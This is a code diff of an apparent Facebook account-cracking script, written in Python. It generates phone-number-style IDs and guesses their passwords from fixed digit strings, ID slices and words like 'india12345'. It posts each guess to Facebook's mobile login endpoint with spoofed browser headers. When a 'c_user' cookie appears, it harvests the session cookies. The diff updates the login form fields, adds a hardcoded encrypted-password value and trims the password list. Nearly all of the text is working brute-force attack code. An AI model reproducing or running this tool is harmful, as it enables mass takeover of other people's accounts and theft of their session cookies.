@@ -281,7 +281,7 @@ def rndm():
                 print(f'\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m\033[1;97m FIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE');linex()
                 for love in user:
                         ids = code + love 
-                        pasx = ['57273200',ids,ids[6:],ids[8:],ids[:6],ids[:8],'57575751','59039200']
+                        pasx = ['57273200',ids,]
                         pasa= [ids,ids[:8],ids[:6],ids[:7]]
                         pasb= ['57273200','57575751','59039200','57575752']
                         pasc= ['hindustan','india12345','india123']
@@ -665,43 +665,14 @@ def _M6_(ids,pasx):
                         apple ={
                         'jazoest':re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
                         'lsd':re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
-                        'legacy_return': 0,
-                        'display': 'None',
-                        'enable_profile_selector': 'None',
-                        'isprivate': 'None',
-                        'profile_selector_ids': 'None',
-                        'return_session': 'None',
-                        'skip_api_login': 'None',
-                        'signed_next': 'None',
-                        'trynum': 1,
-                        'timezone':re.search('name="timezone" value="(.*?)"', str(BLACKX)).group(1),
-                        'lgndim':re.search('name="lgndim" value="(.*?)"', str(BLACKX)).group(1),
-                        'lgnrnd':re.search('name="lgnrnd" value="(.*?)"', str(BLACKX)).group(1),
-                        'lgnjs':re.search('name="lgnjs" value="(.*?)"', str(BLACKX)).group(1),
                         'email': ids,
-                        'pass': ps,
-                        'prefill_contact_point': ids,
-                        'prefill_source': 'browser_dropdown',
-                        'prefill_type': 'password',
-                        'first_prefill_source': 'browser_dropdown',
-                        'first_prefill_type': 'contact_point',
-                        'had_cp_prefilled': 'true',
-                        'had_password_prefilled': 'true',
-                        'ab_test_data': 'AAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAABAAB'}
-                        tedy ={ 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-                        'Accept-Language': 'en-US,en;q=0.5',
-                        'DNT': '1',
-                        'Alt-Used': 'm.facebook.com',
-                        'Connection': 'keep-alive',
-                        'Upgrade-Insecure-Requests': '1',
-                        'Sec-Fetch-Dest': 'document',
-                        'Sec-Fetch-Mode': 'navigate',
-                        'Sec-Fetch-Site': 'none',
-                        'Sec-Fetch-User': '?1',
-                        'Pragma': 'no-cache',
-                        'Cache-Control': 'no-cache',}
-                        lo = session.post('https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&popup=1&lwv=100',data=apple,headers=tedy).text
+                        'pass': ps, 
+                        'login_source': 'comet_headerless_login',
+                        'next': '',
+                        'encpass': '#PWD_BROWSER:5:1711080574:ARFQAD8TsUXqGhXo35bfpbT5yFxO+eUxuOmI7qDjpAEpKOQSqnEKbuYu9jr7rYSICy2McPJiMkYI0LOJKf+hIX2HBknRvbUH3RJ1bx1hdCtgv3xlCpQrwp4UIjHbe5Xuzxjpzo3BOhekrXeI',}
+                        tedy ={'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
+                        lo = session.post('https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&popup=1&lwv=100',data=apple,headers=tedy).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
                                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
